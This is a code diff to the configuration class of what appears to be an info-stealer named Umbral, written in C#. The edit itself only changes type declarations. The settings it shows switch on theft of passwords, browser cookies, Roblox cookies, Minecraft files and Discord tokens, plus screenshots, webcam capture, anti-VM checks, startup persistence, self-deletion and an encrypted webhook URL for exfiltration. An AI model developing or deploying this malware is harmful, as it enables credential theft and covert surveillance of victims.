@@ -41,25 +41,25 @@ namespace Umbral.payload.Config
             //----------------CONFIG----------------
             //--------------------------------------
 
-            var webhookUrl = "";
-            var ping = true; 
-            var version = "0.1";
-            var antiVm = false;
-            var startup = false;
-            var stealPasswords = true;
-            var stealCookies = true;
-            var stealRobloxCookies = true;
-            var stealMinecraftFiles = true;
-            var stealDiscordTokens = true;
-            var takeScreenshot = true;
-            var deleteSelf = false;
-            var captureWebcam = true;
+            string webhookUrl = "";
+            bool ping = true;
+            string version = "0.1";
+            bool antiVm = false;
+            bool startup = false;
+            bool stealPasswords = true;
+            bool stealCookies = true;
+            bool stealRobloxCookies = true;
+            bool stealMinecraftFiles = true;
+            bool stealDiscordTokens = true;
+            bool takeScreenshot = true;
+            bool deleteSelf = false;
+            bool captureWebcam = true;
 
             //--------------------------------------
 
-            var mutex = "ThisIsAUniQueMuTex";
-            var key = "";
-            var iv = "";
+            string mutex = "ThisIsAUniQueMuTex";
+            string key = "";
+            string iv = "";
 
             WebhookUrl = Decrypt(webhookUrl, key, iv);
             Ping = ping;
@@ -77,7 +77,7 @@ namespace Umbral.payload.Config
             Mutex = mutex;
         }
 
-        private static string Decrypt(string encrypted, string _key, string _iv)
+        static private string Decrypt(string encrypted, string _key, string _iv)
         {
             byte[] buffer = Convert.FromBase64String(encrypted);
             byte[] key = Convert.FromBase64String(_key);
